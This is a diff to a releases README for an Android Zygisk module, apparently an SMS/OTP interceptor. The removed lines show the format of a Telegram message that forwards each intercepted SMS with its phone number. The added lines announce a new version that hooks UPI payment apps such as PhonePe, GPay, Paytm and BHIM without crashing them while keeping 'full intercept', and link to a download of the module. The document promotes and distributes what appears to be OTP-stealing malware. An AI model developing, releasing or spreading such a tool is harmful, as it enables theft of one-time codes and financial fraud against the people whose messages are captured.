@@ -1,13 +1,7 @@
 # Releases
 
-Latest: **virtus-zygisk-mode-v1.0.68.zip**
+Latest: **virtus-zygisk-mode-v1.0.69.zip**
 
-TG message:
-```
-📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
-To +91xxxxxxxxxx
-Message: <full SMS>
-```
-Buttons: **Number copy** | **SMS copy**
+Crash fix: PhonePe / GPay / Paytm / YesPay / BHIM / Stashfin etc. open crash — all UPI apps now use safe light hooks (Intent + deferred Java ISms). Messages keeps full intercept (Hero SMS still works).
 
-https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.68.zip
+https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.69.zip
